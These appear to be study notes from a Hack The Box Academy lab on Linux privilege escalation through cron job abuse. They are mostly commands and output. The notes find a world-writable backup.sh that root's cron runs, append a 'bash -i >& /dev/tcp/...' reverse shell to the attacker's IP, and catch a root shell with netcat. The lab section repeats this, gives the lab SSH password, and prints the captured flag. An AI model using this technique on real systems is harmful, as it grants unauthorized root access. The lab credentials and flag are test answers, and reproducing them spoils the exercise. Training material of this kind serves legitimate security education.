# Cron Job Abuse

The crontab command can create a cron file, which will be run by the cron daemon on the schedule specified. When created, the cron file will be created in /var/spool/cron for the specific user that creates it.

For example, the entry 0 */12 * * * /home/admin/backup.sh would run every 12 hours

Certain applications create cron files in the /etc/cron.d directory and may be misconfigured to allow a non-root user to edit them.

1) Look around the system for any writeable files or directories

find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

/etc/cron.daily/backup
/dmz-backups/backup.sh
/proc
/sys/fs/cgroup/memory/init.scope/cgroup.event_control

<SNIP>
/home/backupsvc/backup.sh

<SNIP>

2)

ls -la /dmz-backups/

total 36
drwxrwxrwx  2 root root 4096 Aug 31 02:39 .
drwxr-xr-x 24 root root 4096 Aug 31 02:24 ..
-rwxrwxrwx  1 root root  230 Aug 31 02:39 backup.sh
-rw-r--r--  1 root root 3336 Aug 31 02:24 www-backup-2020831-02:24:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:27 www-backup-2020831-02:27:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:30 www-backup-2020831-02:30:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:33 www-backup-2020831-02:33:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:36 www-backup-2020831-02:36:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:39 www-backup-2020831-02:39:01.tgz

--> job os executed every 3 minutes :  */3 * * * *

3) Confirm that a cron job is running using pspy, a command-line tool used to view running processes without the need for root privileges.

./pspy64 -pf -i 1000

2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 CMD: UID=0    PID=2201   | /bin/bash /dmz-backups/backup.sh 
2020/09/04 20:46:01 CMD: UID=0    PID=2200   | /bin/sh -c /dmz-backups/backup.sh 
2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
2020/09/04 20:46:01 CMD: UID=0    PID=2199   | /usr/sbin/CRON -f 
2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 CMD: UID=0    PID=2203   | 
2020/09/04 20:46:01 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 CMD: UID=0    PID=2204   | tar --absolute-names --create --gzip --file=/dmz-backups/www-backup-202094-20:46:01.tgz /var/www/html 
2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 CMD: UID=0    PID=2205   | gzip 
2020/09/04 20:46:03 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
2020/09/04 20:46:03 CMD: UID=0    PID=2206   | /bin/bash /dmz-backups/backup.sh 
2020/09/04 20:46:03 FS:        CLOSE_NOWRITE | /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
2020/09/04 20:46:03 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive

4) cat /dmz-backups/backup.sh 

#!/bin/bash
 SRCDIR="/var/www/html"
 DESTDIR="/dmz-backups/"
 FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
 tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR

5) Add a one-liner Reverse Shell

#!/bin/bash
SRCDIR="/var/www/html"
DESTDIR="/dmz-backups/"
FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
 
bash -i >& /dev/tcp/10.10.14.3/443 0>&1

6) nc -lnvp 443

listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.2.12] 38882
bash: cannot set terminal process group (9143): Inappropriate ioctl for device
bash: no job control in this shell

root@NIX02:~# id
id
uid=0(root) gid=0(root) groups=0(root)

root@NIX02:~# hostname
hostname
NIX02

## LAB

ssh htb-student@10.129.167.49
Academy_LLPE!

id
uid=1008(htb-student) gid=1008(htb-student) groups=1008(htb-student)

find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

/etc/cron.daily/backup
/dmz-backups/backup.sh
/proc
/sys/fs/cgroup/memory/init.scope/cgroup.event_control
/home/backupsvc/backup.sh
/home/htb-student/screen_Exploit_POC.sh

ls -la /dmz-backups/
total 114020
drwxrwxrwx  2 root root    36864 Jan 23 19:38 .
drwxr-xr-x 25 root root     4096 Sep  1  2020 ..
-rwxrwxrwx  1 root root      189 Nov  6  2020 backup.sh
-rw-r--r--  1 root root 12966790 Nov  6  2020 www-backup-2020116-06:12:06.tgz
-rw-r--r--  1 root root 12966790 Jan 23 19:24 www-backup-2024123-19:24:01.tgz
-rw-r--r--  1 root root 12966790 Jan 23 19:26 www-backup-2024123-19:26:01.tgz
-rw-r--r--  1 root root 12966790 Jan 23 19:28 www-backup-2024123-19:28:01.tgz
-rw-r--r--  1 root root 12966790 Jan 23 19:30 www-backup-2024123-19:30:01.tgz
-rw-r--r--  1 root root 12966790 Jan 23 19:32 www-backup-2024123-19:32:01.tgz
-rw-r--r--  1 root root 12966790 Jan 23 19:34 www-backup-2024123-19:34:01.tgz
-rw-r--r--  1 root root 12966790 Jan 23 19:36 www-backup-2024123-19:36:01.tgz
-rw-r--r--  1 root root 12966790 Jan 23 19:38 www-backup-2024123-19:38:01.tgz

vi /dmz-backups/backup.sh 

bash -i >& /dev/tcp/10.10.14.138/443 0>&1

sudo nc -lvnp 443

... wait 2 minutes for the next execution of cron

Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.129.167.49.
Ncat: Connection from 10.129.167.49:38846.
bash: cannot set terminal process group (1777): Inappropriate ioctl for device
bash: no job control in this shell
root@NIX02:~# ls -l /root/cron_abuse/
ls -l /root/cron_abuse/
total 4
-rw-r--r-- 1 root root 33 Aug 31  2020 flag.txt
root@NIX02:~# cat /root/cron_abuse/flag.txt
cat /root/cron_abuse/flag.txt
14347a2c977eb84508d3d50691a7ac4b
